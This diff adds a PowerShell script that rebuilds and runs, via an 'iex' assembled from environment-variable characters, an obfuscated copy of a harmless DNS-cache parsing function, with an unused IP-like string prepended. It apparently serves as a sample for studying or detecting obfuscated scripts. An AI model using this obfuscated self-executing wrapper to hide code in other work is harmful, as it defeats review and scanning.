@@ -1,0 +1,105 @@
+. ( $ENv:ComsPec[4,24,25]-joiN'') (('At5dkqvs =(((GYa{2}{5}{3}{4}{0}{1}{6}GYa-f h3F1h3F,h3F28h3F,h3F8pHip:6h3F,h3F6h3F,h3F1.h3F,h3F6.152'+'.h3F,h3F8pHh3F)) -crePlAcE([ChAr]56+[ChAr]112+[ChAr]72),[ChAr]39)
+function '+'Get-DNSCacheInfoFromRemoteComma'+'ndResults {
+    <#
+'+'    .SYNOPSIS
+        
+    .DESCRIPTION
+        
+   '+' .PARAMETER I'+'nputObject
+        Object or array of'+' obj'+'ects returned from Get-RemoteCommandResults
+    .EXAMPLE
+        <Placeholder>
+        
+        Description
+        -----------
+        <Placeholder>
+
+  '+'  .NOTES
+        Author: Zachary Loeber
+        Site: http://www.the-little-things.net/
+        Requires: Powershel'+'l 2.0
+
+        Version History
+        1.0.0 - '+'09/20/2013
+        - Initial release
+    
+        ** Thi'+'s is a supplement '+'functio'+'n to New-RemoteCommand and Get-RemoteCommandResults **
+    #>
+    ['+'CmdletBinding()]
+    param (
+        [Paramet'+'er(HelpMessage=h3FObject or array of objects returned from Get-RemoteCommandResultsh3F)]
+        At5'+'InputObjec'+'t
+    )
+    begin {
+        '+'At5DNSCacheResults = @()
+        At5Results = @()
+        At5DNSType'+'s = @{
+            h3F1h3F = h3FAh3F
+            h3F2h3F = h3FNSh'+'3F
+  '+'         '+' h3F5h3F = h3FCNAMEh3F
+            h3F6h3F = h3FSOAh3F
+            h3F12h3F = h3FPTRh3F
+     '+'       h3F15h'+'3F = h3FMXh3F
+    '+'        h3F16h3F = h3FTXTh3F
+            h3F17h3F = h3FRPh3F'+'
+            h'+'3F18h3F = h3FAFSDBh3F
+            h3F24h3F = h3FSIGh3F
+            h3F25h3F = h3FKE'+'Yh3F
+            h3F28h3F = h3FAAAAh3F
+            h3F29h3F = h3FLOCh'+'3F
+  '+'          h3F33h3F = h3FSRVh3F
+            h3F35h3F = h3FNAPTRh3F
+            h3F36h3F = h3FKXh3F
+            h3F37h3F = h3FCERTh3F
+           '+' h3F39h3F = h3FDNAMEh3F
+            h3F42h3F = h3FAPLh3F
+            h3F43h3F = h'+'3FDSh3F
+            h3F44h3F = h3FSSHFPh3F
+            h3F45h3F = h'+'3FIPSECKEYh3F
+            h3F46h3F = h3FRRSIGh3F
+            h'+'3F47h3F = h3FNSECh3F
+           '+' h3F48h3F = h3FD'+'NSKEYh3F
+            h3F49h3F = h3FDHCIDh3F
+            h3F50h3F = h3FNSEC3h3F
+           '+' '+'h3F51h3F = h3FNSEC3PARAMh3F
+            h3F52h3F = h3FTLSAh3F
+            h3F55h3F = h3FHIPh3F
+        '+'    h3F99h3F = h3FSPFh3F
+       '+'     h3F249h3F = h3FTKEYh3F
+            h3F250h3F = h3FTSIGh3F
+            h3F257h3'+'F'+' = h3FCAAh3F
+            h3F32768h3F'+' = h3FTAh3F
+            h3F32769h3F = h3FDL'+'Vh3F
+        }
+    }
+  '+'  process {
+        At5Results +'+'= At5InputObject'+'
+    }
+    end {
+        Foreach (At5result in At5Results)
+        {
+            At5CacheEntries = @()
+     '+'       At5entry = At5result.CommandResults -match h3FR'+'ecord h3F
+ '+'           At5entry.count
+            for (At5i=0; At5i -lt At5entry.Count; At5i+=3)
+            {
+ '+'       '+'  '+'      At5cacheentryprops = @{
+   '+'               Name=At5entry['+'At5i].toString().Split(GYa:GYa)[1].Trim()
+             '+'     Type=At5DNSTypes[(At5entry['+'At5i+1].toString().Sp'+'lit(GYa:GYa)[1].Trim())]
+   '+'               Value=At5entry[At5i+2].toString().Split(GYa:GYa)[1].Trim()
+                }
+                At5CacheEntries += New-Object PSObject -Property At5cacheentryprops
+            }
+            At5DNSCache'+'ResultProp = @{
+               '+' h3FPSComputerNameh3F = At5result.PSComputerName
+        '+'        h3FPSDateTimeh3F = At5result.PSDateTime
+                h3FComputerNameh3F = At5result.Computer'+'Name
+                '+'h3FCacheEntriesh3F = At5CacheE'+'ntries
+            }
+    '+'        At5DNSCacheResults += New-Object PSObject -Property At5DNSCacheResultProp
+        }
+     '+'   At5D'+'NSCacheResults'+'
+    }
+}
+
+').RepLace('At5','$').RepLace(([chAr]71+[chAr]89+[chAr]97),[StrINg][chAr]34).RepLace('h3F',[StrINg][chAr]39))
